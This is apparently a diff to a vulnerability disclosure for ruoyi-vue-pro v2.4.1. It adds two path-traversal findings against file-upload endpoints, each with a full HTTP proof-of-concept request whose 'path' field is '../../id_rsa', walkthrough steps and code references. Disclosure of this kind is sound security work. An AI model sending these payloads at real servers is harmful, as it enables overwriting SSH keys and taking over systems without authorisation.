@@ -6,7 +6,7 @@ Longlong Gong
 
 Address: [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro)
 
-## SQL injection
+## 1、SQL injection
 
 ###  `/report/go-view/data/get-by-sql` SQL injection
 
@@ -80,7 +80,7 @@ Report Management ->Large Screen Designer ->Projects ->My All Projects. After im
 
 ![image-20250302125747000](assets/image-20250302125747000.png)
 
-## SSTI
+## 2、SSTI
 
 ###  `/admin-api/bpm/model/deploy` SSTI
 
@@ -189,3 +189,220 @@ ruoyi-vue-pro-v2.4.1(jdk8-11)\yudao-module-bpm\yudao-module-bpm-biz\src\main\jav
 ![image-20250303111323538](assets/image-20250303111323538.png)
 
 ![image-20250303111905282](assets/image-20250303111905282.png)
+
+## 3、File Path Traversal Front-end
+
+###  `/app-api/infra/file/upload` File Path Traversal
+
+[Affected version]
+
+v2.4.1
+
+
+
+[Affected Component]
+
+/app-api/infra/file/upload
+
+
+
+[Software]
+
+https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip
+
+
+
+[Description]
+
+There is a directory traversal vulnerability in the front-end store interface of Ruoyi Vue Pro v2.4.1, specifically in the `/app-api/infra/file/upload`. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.
+
+POC
+
+```
+POST /app-api/infra/file/upload HTTP/1.1
+Host: 127.0.0.1:48080
+Content-Length: 297
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDTWde2L7596MQhu6
+tenant-id: 1
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Origin: http://localhost:3000
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryDTWde2L7596MQhu6
+Content-Disposition: form-data; name="file"; filename="111.txt"
+Content-Type: image/jpeg
+
+flag{ssh-key}
+------WebKitFormBoundaryDTWde2L7596MQhu6
+Content-Disposition: form-data; name="path"
+
+../../id_rsa
+------WebKitFormBoundaryDTWde2L7596MQhu6--
+
+```
+
+We can first see that there is no id_rsa file in the root directory here
+
+![image-20250309141642375](assets/image-20250309141642375.png)
+
+We go to Infrastructure ->File Management ->File Configuration
+
+![image-20250309141737911](assets/image-20250309141737911.png)
+
+Add a local disk storage and set it as the primary configuration
+
+![image-20250309141834365](assets/image-20250309141834365.png)
+
+![image-20250309141902567](assets/image-20250309141902567.png)
+
+Open the front-end mall project
+
+![image-20250309141958263](assets/image-20250309141958263.png)
+
+First, log in. Enter any phone number here to send the verification code. Enter the verification code 9999 to successfully log in
+
+![image-20250309142049397](assets/image-20250309142049397.png)
+
+![image-20250309142140927](assets/image-20250309142140927.png)
+
+Click on the avatar and click on 'modify'
+
+![image-20250309142200051](assets/image-20250309142200051.png)
+
+![image-20250309142225743](assets/image-20250309142225743.png)
+
+Here, file upload can add a field 'path', which causes directory traversal
+
+![image-20250309142307125](assets/image-20250309142307125.png)
+
+Follow the code below to see the principle
+
+yudao\ruoyi-vue-pro-v2.4.1(jdk17-21)\yudao-module-infra\yudao-module-infra-biz\src\main\java\cn\iocoder\yudao\module\infra\controller\app\file\AppFileController.java
+
+![image-20250309144833562](assets/image-20250309144833562.png)
+
+![image-20250309142355589](assets/image-20250309142355589.png)
+
+![image-20250309142436449](assets/image-20250309142436449.png)
+
+Upload successful here
+
+![image-20250309142457102](assets/image-20250309142457102.png)
+
+You can see the results here. If there is a situation where JSP parsing occurs on a Linux server or other web projects deployed on this disk, it may cause the server to crash
+
+![image-20250309142524116](assets/image-20250309142524116.png)
+
+## 4、File Path Traversal Backend
+
+###  `/admin-api/infra/file/upload` File Path Traversal
+
+[Affected version]
+
+v2.4.1
+
+
+
+[Affected Component]
+
+/admin-api/infra/file/upload
+
+
+
+[Software]
+
+https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip
+
+
+
+[Description]
+
+There is a directory traversal vulnerability in the backend file upload interface of Ruoyi Vue Pro v2.4.1, specifically in the `/admin-api/infra/file/upload` section. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.
+
+POC
+
+```
+POST /admin-api/infra/file/upload HTTP/1.1
+Host: localhost:48080
+Content-Length: 297
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+sec-ch-ua-mobile: ?0
+Authorization: Bearer 8b1569dd6967411ab76b02ea8677de28
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryllisARk9GtqriRXO
+Accept: application/json, text/plain, */*
+tenant-id: 1
+sec-ch-ua-platform: "Windows"
+Origin: http://localhost
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryllisARk9GtqriRXO
+Content-Disposition: form-data; name="file"; filename="111.jpg"
+Content-Type: image/jpeg
+
+flag{ssh-key}
+------WebKitFormBoundaryllisARk9GtqriRXO
+Content-Disposition: form-data; name="path"
+
+../../id_rsa
+------WebKitFormBoundaryllisARk9GtqriRXO--
+
+```
+
+We can see on drive E that there are no files we want to upload inside
+
+![image-20250309144355859](assets/image-20250309144355859.png)
+
+We first configure the upload location to be local, Infrastructure ->File Management ->File Configuration
+
+![image-20250309144522098](assets/image-20250309144522098.png)
+
+Set as primary configuration
+
+![image-20250309144539914](assets/image-20250309144539914.png)
+
+Go to Infrastructure ->File Management ->File List, upload an image file
+
+![image-20250309144619561](assets/image-20250309144619561.png)
+
+Send upload interface to repeat interface
+
+![image-20250309144714942](assets/image-20250309144714942.png)
+
+Let's come to the code to see the principle
+
+yudao\ruoyi-vue-pro-v2.4.1(jdk17-21)\yudao-module-infra\yudao-module-infra-biz\src\main\java\cn\iocoder\yudao\module\infra\controller\admin\file\FileController.java
+
+![image-20250309144748239](assets/image-20250309144748239.png)
+
+When we add a path field, we will take our path and concatenate it
+
+![image-20250309145008296](assets/image-20250309145008296.png)
+
+We can see that the directory traversal was successful
+
+![image-20250309145036314](assets/image-20250309145036314.png)
+
+![image-20250309145047279](assets/image-20250309145047279.png)
+
+Successfully added a file with the content 'flag {ssh key}' to the root directory of drive E. Uploading ssh-ras on a Linux system may result in server permissions being compromised
+
+![image-20250309145107163](assets/image-20250309145107163.png)
+
+![image-20250309145129470](assets/image-20250309145129470.png)
